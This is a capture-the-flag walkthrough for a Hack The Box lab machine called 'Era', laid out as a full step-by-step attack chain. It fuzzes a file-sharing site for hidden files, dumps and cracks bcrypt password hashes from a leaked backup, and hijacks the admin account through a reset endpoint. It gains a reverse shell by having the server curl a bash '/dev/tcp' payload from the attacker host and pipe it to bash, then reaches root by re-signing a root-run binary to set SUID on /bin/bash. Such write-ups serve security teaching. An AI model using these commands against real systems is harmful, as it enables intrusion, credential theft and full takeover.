---
name: Era
difficulty: medium
os: linux
platform: htb
date: 2025/07/31
releasedDate: 2026-01-01
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/fcd00b2542a936e4281ba19e0bd0b025.png
---

## Enumeration


We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.79 -o allPorts
```
```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We can see that ports 21 (FTP) and 80 (HTTP) are open.

We will try to get more information about the services running on these ports by scanning them with service version detection and script scanning using `-sC` and `-sV` options:
```bash
nmap -p21,80 -sCV 10.10.11.79 -oN targeted
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

We will add the custom domain `era.htb` to our `/etc/hosts` file:
```bash
echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts
```

Next, we look for subdomains of `era.htb` using `ffuf` with a wordlist:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://era.htb -H "Host: FUZZ.era.htb" -mc 200 -t 200
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 63ms]
```

We find a subdomain `file.era.htb` that returns a 200 status code. 
We have to add this subdomain to our `/etc/hosts` file as well:
```bash
10.10.11.79 era.htb file.era.htb
```

We can see there is a file upload web service running on this subdomain. 

We use `ffuf` to enumerate all the php files on this subdomain:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://file.era.htb/FUZZ -e .php -t 200 -fs 6765
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6765
________________________________________________

.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 62ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 63ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 68ms]
LICENSE                 [Status: 200, Size: 34524, Words: 5707, Lines: 663, Duration: 95ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 93ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 101ms]
files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 102ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 104ms]
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 85ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 94ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 97ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 87ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 88ms]
```

We can see there is an interesting file: `register.php`. We can create a new user in this endpoint and try to log in with it.

We find there is a file upload functionality. If we upload a file it generates a URL like this:
```
http://file.era.htb/download.php?id=<file_id>
```

We can check if there is any already uploaded file using `ffuf` and a made dictionary of numbers:
```bash
seq 1 10000 > numbers.txt
ffuf -w numbers.txt -u http://file.era.htb/download.php?id=FUZZ -H "Cookie: PHPSESSID=vo9v37jm4rtn5fujk0pn6cqq4s" -t 200 -fs 7686
```
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: numbers.txt
 :: Header           : Cookie: PHPSESSID=vo9v37jm4rtn5fujk0pn6cqq4s
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 95ms]
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 126ms]
2781                    [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 78ms]
:: Progress: [10000/10000] :: Job [1/1] :: 677 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

We find that files with IDs `150`, `54`, and `2781` exist:
- `2781` is the file we uploaded earlier.
- `150` is a file named `signing.zip`.
- `54` is a file named `site-backup-30-08-24.zip`.

We can download these files and check their contents:
```bash
unzip signing.zip -d signing                             
```
```
Archive:  signing.zip
  inflating: signing/key.pem         
  inflating: signing/x509.genkey    
```

```bash
unzip site-backup-30-08-24.zip -d site-backup-30-08-24
```

```
Archive:  site-backup-30-08-24.zip
  inflating: site-backup-30-08-24/LICENSE  
  inflating: site-backup-30-08-24/bg.jpg  
   creating: site-backup-30-08-24/css/
  inflating: site-backup-30-08-24/css/main.css.save  
  inflating: site-backup-30-08-24/css/main.css  
  inflating: site-backup-30-08-24/css/fontawesome-all.min.css  
  inflating: site-backup-30-08-24/css/noscript.css  
   creating: site-backup-30-08-24/css/images/
 extracting: site-backup-30-08-24/css/images/overlay.png  
  inflating: site-backup-30-08-24/download.php  
  inflating: site-backup-30-08-24/filedb.sqlite  
   creating: site-backup-30-08-24/files/
  inflating: site-backup-30-08-24/files/.htaccess  
 extracting: site-backup-30-08-24/files/index.php  
  inflating: site-backup-30-08-24/functions.global.php  
  inflating: site-backup-30-08-24/index.php  
  inflating: site-backup-30-08-24/initial_layout.php  
  inflating: site-backup-30-08-24/layout.php  
  inflating: site-backup-30-08-24/layout_login.php  
  inflating: site-backup-30-08-24/login.php  
  inflating: site-backup-30-08-24/logout.php  
  inflating: site-backup-30-08-24/main.png  
  inflating: site-backup-30-08-24/manage.php  
  inflating: site-backup-30-08-24/register.php  
  inflating: site-backup-30-08-24/reset.php  
   creating: site-backup-30-08-24/sass/
   creating: site-backup-30-08-24/sass/layout/
  inflating: site-backup-30-08-24/sass/layout/_wrapper.scss  
  inflating: site-backup-30-08-24/sass/layout/_footer.scss  
  inflating: site-backup-30-08-24/sass/layout/_main.scss  
  inflating: site-backup-30-08-24/sass/main.scss  
   creating: site-backup-30-08-24/sass/base/
  inflating: site-backup-30-08-24/sass/base/_page.scss  
  inflating: site-backup-30-08-24/sass/base/_reset.scss  
  inflating: site-backup-30-08-24/sass/base/_typography.scss  
   creating: site-backup-30-08-24/sass/libs/
  inflating: site-backup-30-08-24/sass/libs/_vars.scss  
  inflating: site-backup-30-08-24/sass/libs/_vendor.scss  
  inflating: site-backup-30-08-24/sass/libs/_functions.scss  
  inflating: site-backup-30-08-24/sass/libs/_mixins.scss  
  inflating: site-backup-30-08-24/sass/libs/_breakpoints.scss  
  inflating: site-backup-30-08-24/sass/noscript.scss  
   creating: site-backup-30-08-24/sass/components/
  inflating: site-backup-30-08-24/sass/components/_actions.scss  
  inflating: site-backup-30-08-24/sass/components/_icons.scss  
  inflating: site-backup-30-08-24/sass/components/_button.scss  
  inflating: site-backup-30-08-24/sass/components/_icon.scss  
  inflating: site-backup-30-08-24/sass/components/_list.scss  
  inflating: site-backup-30-08-24/sass/components/_form.scss  
  inflating: site-backup-30-08-24/screen-download.png  
  inflating: site-backup-30-08-24/screen-login.png  
  inflating: site-backup-30-08-24/screen-main.png  
  inflating: site-backup-30-08-24/screen-manage.png  
  inflating: site-backup-30-08-24/screen-upload.png  
  inflating: site-backup-30-08-24/security_login.php  
  inflating: site-backup-30-08-24/upload.php  
   creating: site-backup-30-08-24/webfonts/
  inflating: site-backup-30-08-24/webfonts/fa-solid-900.eot  
  inflating: site-backup-30-08-24/webfonts/fa-regular-400.ttf  
  inflating: site-backup-30-08-24/webfonts/fa-regular-400.woff  
  inflating: site-backup-30-08-24/webfonts/fa-solid-900.svg  
  inflating: site-backup-30-08-24/webfonts/fa-solid-900.ttf  
  inflating: site-backup-30-08-24/webfonts/fa-solid-900.woff  
  inflating: site-backup-30-08-24/webfonts/fa-brands-400.ttf  
 extracting: site-backup-30-08-24/webfonts/fa-regular-400.woff2  
  inflating: site-backup-30-08-24/webfonts/fa-solid-900.woff2  
  inflating: site-backup-30-08-24/webfonts/fa-regular-400.eot  
  inflating: site-backup-30-08-24/webfonts/fa-regular-400.svg  
  inflating: site-backup-30-08-24/webfonts/fa-brands-400.woff2  
  inflating: site-backup-30-08-24/webfonts/fa-brands-400.woff  
  inflating: site-backup-30-08-24/webfonts/fa-brands-400.eot  
  inflating: site-backup-30-08-24/webfonts/fa-brands-400.svg
```

We can get the contents of the `site-backup-30-08-24/filedb.sqlite` file using `sqlite3`:
```bash
sqlite3 site-backup-30-08-24/filedb.sqlite .dump
```
```sql
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE files (
                fileid int NOT NULL PRIMARY KEY,
                filepath varchar(255) NOT NULL,
                fileowner int NOT NULL,
                filedate timestamp NOT NULL
                );
INSERT INTO files VALUES(54,'files/site-backup-30-08-24.zip',1,1725044282);
CREATE TABLE users (
                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_name varchar(255) NOT NULL,
                user_password varchar(255) NOT NULL,
                auto_delete_files_after int NOT NULL
                , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));
INSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');
INSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(5,'john','$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(6,'ethan','$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC',-1,NULL,NULL,NULL);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',16);
COMMIT;
```

To crack the passwords, we prepare a file with `username:bcryptpassword` format:
```bash
sqlite3 site-backup-30-08-24/filedb.sqlite .dump | \
grep -i "^Insert into users values(" | \
awk -F, '{ 
    gsub(/'\''/, "", $2); 
    gsub(/'\''/, "", $3); 
    print $2 ":" $3 
}' | tee hashes.txt
```
```
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

We can crack the passwords using hashcat:
```bash
hashcat -m 3200 -a 0 -w 3 hashes.txt /usr/share/wordlists/rockyou.txt --username
```
```
eric:america
yuri:mustang
```

We can to log in to the ftp server using the credentials we found earlier:
```bash
lftp ftp://yuri:mustang@10.10.11.79
```

We mirror the entire FTP directory to our local machine:
```bash
mirror 
``` 

## User Exploitation


If we check the site backup, we can see that the endpoint `reset.php` is vulnerable to SSRF attack allowing us to change security answers of other users.
We will change the security answers of the user `admin_ef01cab31aa` to login as this user:
```
POST /reset.php HTTP/1.1
Host: file.era.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://file.era.htb
Connection: close
Referer: http://file.era.htb/reset.php
Cookie: PHPSESSID=vo9v37jm4rtn5fujk0pn6cqq4s
Upgrade-Insecure-Requests: 1

username=admin_ef01cab31aa&new_answer1=test&new_answer2=test&new_answer3=test
```

We can check php configuration `php8.1_conf` directory from ftp server. There we can see some `.so` files which are PHP extensions.
We can see that the `ssh2` extension is installed. This extension allows us to execute commands on a remote server using SSH.
```bash
ls php8.1_conf
```
```
build        exif.so      gettext.so  pdo_sqlite.so  shmop.so      ssh2.so     tokenizer.so  xsl.so
calendar.so  ffi.so       iconv.so    phar.so        simplexml.so  sysvmsg.so  xmlreader.so  zip.so
ctype.so     fileinfo.so  opcache.so  posix.so       sockets.so    sysvsem.so  xml.so
dom.so       ftp.so       pdo.so      readline.so    sqlite3.so    sysvshm.so  xmlwriter.so
```


We find there is a vulnerability in the `download.php` file that allows us select the file wrapper to use when downloading files.
```php
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
  $format = isset($_GET['format']) ? $_GET['format'] : '';
  $file = $fetched[0];

  if (strpos($format, '://') !== false) {
    $wrapper = $format;
    header('Content-Type: application/octet-stream');
  } else {
    $wrapper = '';
    header('Content-Type: text/html');
  }

  try {
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
    $full_path = $wrapper ? $wrapper . $file : $file;
    // Debug Output
    echo "Opening: " . $full_path . "\n";
    echo $file_content;

  } catch (Exception $e) {
    echo "Error reading file: " . $e->getMessage();
  }
```

As we already have checked, the `ssh2` extension is installed. We can use the `ssh2.exec` wrapper to execute commands on the remote server.

We can use the following URL to execute a `<command>` on the remote server while logged in as the user `admin_ef01cab31aa` (which is the admin user):
```
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1:22/<command>;
```

We set up a http server to serve a reverse shell payload:
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.231/443 0>&1';" > shell.sh
python3 -m http.server 80
```

We can set up a reverse shell listener on our local machine:
```bash
nc -lvnp 443
```

Then we can execute a command to get a reverse shell as the user `eric`:
```
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1:22/curl%2010.10.14.231:80/shell.sh|bash;
```

We get a reverse shell as the user `eric` and we can read the user flag:
```bash
cat /home/eric/user.txt
```
```
user flag value
```


## Root Exploitation

We can check if user `eric` has sudo privileges:
```bash
sudo -l
```
```
Sorry, user eric may not run sudo on era.
```

We check `id` command to see the user groups:
```bash
id
```
```
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

We can see that user `eric` is part of the `devs` group. We can check the files that are owned by root and are readable by the `devs` group:
```bash
find / -group devs -readable -type f 2>/dev/null
```
```
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

We can see that there are two files owned by root and readable by the `devs` group:
- `/opt/AV/periodic-checks/monitor`
  - Looks like a binary file which is executed by root every minute.

- `/opt/AV/periodic-checks/status.log`
  - Looks like a log file which is written by the `monitor` binary.


As the `monitor` binary is executed by root every minute, we can try to modify `monitor` to execute a reverse shell as root.

We find out the `monitor` binary is a 64-bit ELF file (C compiled binary):
```bash
file /opt/AV/periodic-checks/monitor
```
```
/opt/AV/periodic-checks/monitor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d4f8c5b6c7e8f9a0b1c2d3e4f5a6b7c8d9e0f1g2, with debug_info, not stripped
```

We find out the `monitor` binary is signed with a certificate:
```bash
cat /opt/AV/periodic-checks/status.log
```
```
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' - it does not exist: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

So we can try to sign the binary with the certificate we found earlier in the `signing.zip` file in ftp server.

First, we will compile a C program that will execute the command to add SUID permission to `/bin/bash`:
```bash
echo "#include <stdio.h>
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *comando = \"chmod +s /bin/bash\";

    // Ejecuta el comando
    int resultado = system(comando);

    // Comprobamos si ha habido error
    if (resultado == -1) {
        perror(\"Error al ejecutar el comando\");
        return 1;
    }

    return 0;
}" > monitor.c
gcc -Wall monitor.c -o monitor
```
Then we create the signature for the binary using the `key.pem` file:
```bash
openssl cms -sign \
  -in monitor \
  -signer cert.pem -inkey key.pem \
  -outform DER -out monitor.sig -binary -nosmimecap -nocerts -noattr
```

Next, we can combine the binary and the signature into a single file:
```bash
objcopy --add-section .text_sig=monitor.sig monitor monitor.signed
```

We can copy the signed binary to the `/opt/AV/periodic-checks/` directory:
```bash
cat monitor.signed > /opt/AV/periodic-checks/monitor
```


Once `root` executes the `monitor` binary, it will add SUID permission to `/bin/bash`.
We can check if the SUID permission has been added:
```bash
ls -l /bin/bash
```
```
-rwsr-xr-x 1 root root 1196320 Jul 29 12:00 /bin/bash
```

Finally, we can get a root shell by executing the following command:
```bash
/bin/bash -p
whoami
```
```
root
```


We can read the root flag:
```bash
cat /root/root.txt
```
```
root flag value
```


## Conclusion

In this write-up, we successfully exploited the `era.htb` machine by leveraging a file upload vulnerability to gain access to user credentials, and then used those credentials to escalate privileges to root. We demonstrated how to manipulate a binary file to execute arbitrary commands as root, ultimately allowing us to read the root flag. This exercise highlights the importance of secure coding practices and regular security audits to prevent such vulnerabilities.